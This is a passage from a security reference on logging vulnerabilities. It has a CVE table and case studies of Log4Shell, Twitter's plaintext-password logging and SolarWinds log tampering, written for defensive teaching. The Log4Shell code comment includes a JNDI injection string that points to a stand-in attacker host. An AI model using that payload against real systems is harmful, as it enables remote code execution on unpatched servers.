---
source: "common/logging-forensics.md"
title: "Security Logging & Forensics — Audit Trails, SIEM, Log Injection, GDPR"
heading: "Real-World CVEs & Incidents"
category: "common-vuln"
language: "common"
severity: "critical"
tags: [categories, checklist, common-vuln, cves, prevention, real-world, vibe, vulnerability, what]
chunk: 6/8
---

## Real-World CVEs & Incidents

| Vulnerability | CVE / Incident | Impact |
|---------------|---------------|--------|
| **Log4Shell — RCE via Log Input** | CVE-2021-44228 | CRITICAL RCE in 93% of enterprise cloud environments, exploited within hours |
| **Log4j 2.15.0 Incomplete Fix** | CVE-2021-45046 | DoS and continued RCE risk in non-default configurations |
| **Log4j Denial of Service** | CVE-2021-45105 | Uncontrolled recursion in Log4j 2.x pattern layout |
| **SolarWinds Orion Log Tampering** | SUNBURST 2020 | Attackers deleted/modified logs to hide backdoor activity |
| **Capital One — Missing Logs** | 2019 Breach | Insufficient CloudTrail logging delayed breach detection by 4 months |
| **Twitter Logging Passwords in Plaintext** | 2018 | Internal log exposed plaintext passwords to employees |
| **Equifax — Failed Log Monitoring** | CVE-2017-5638 | Apache Struts exploit went undetected for 76 days due to inadequate logging |

### Case Study 1: Log4Shell (CVE-2021-44228) — RCE via Logging

The most severe logging vulnerability in history. Apache Log4j 2.x (the most widely used Java logging library) performed **JNDI lookups** on log messages containing `${jndi:ldap://...}` patterns. An attacker who could control any log message or parameter could trigger **remote code execution**.

**Impact:**
- 93% of enterprise cloud environments affected
- Exploited within hours of disclosure
- Hundreds of millions of exploit attempts in first week
- Affected Minecraft, iCloud, Steam, and thousands of enterprise apps

**The vulnerability:**
```java
// 🔴 VULNERABLE: Log4j 2.0 - 2.14.1
logger.info("User logged in from: {}", userInput);
// If userInput = "${jndi:ldap://evil.com/a}"
// Log4j performs JNDI lookup → LDAP returns malicious class → RCE!

// Fixed in 2.17.0: JNDI lookups disabled by default,
// message lookups disabled, LDAP deserialization restricted
```

**Source:** https://nvd.nist.gov/vuln/detail/CVE-2021-44228

### Case Study 2: Twitter Password Logging Incident (2018)

Twitter disclosed that a bug caused **plaintext passwords** to be written to internal logs before being hashed. The passwords were stored in readable form in an internal log repository.

**Root cause:** The logging framework wrote the password parameter into log statements during registration, before bcrypt hashing completed.

**Consequences:**
- Twitter recommended all 330M users change their passwords
- Internal investigation found no evidence of breach
- Regulatory scrutiny and reputational damage

**Source:** https://blog.twitter.com/en_us/topics/company/2018/keeping-your-account-secure

### Case Study 3: SolarWinds SUNBURST — Log Tampering (2020)

The SolarWinds Orion supply chain attack involved sophisticated log manipulation to evade detection. The SUNBURST backdoor:

1. **Slept for 12-14 days** before activating (evading sandbox analysis)
2. **Deleted install logs** to remove evidence of compromise
3. **Falsified telemetry data** to appear as normal system activity
4. **Modified Windows event logs** selectively to hide lateral movement

This demonstrated that attackers will actively tamper with logs once they gain access, reinforcing the need for **WORM (Write Once, Read Many) storage** and **cryptographic log integrity verification**.

**Source:** https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-352a

---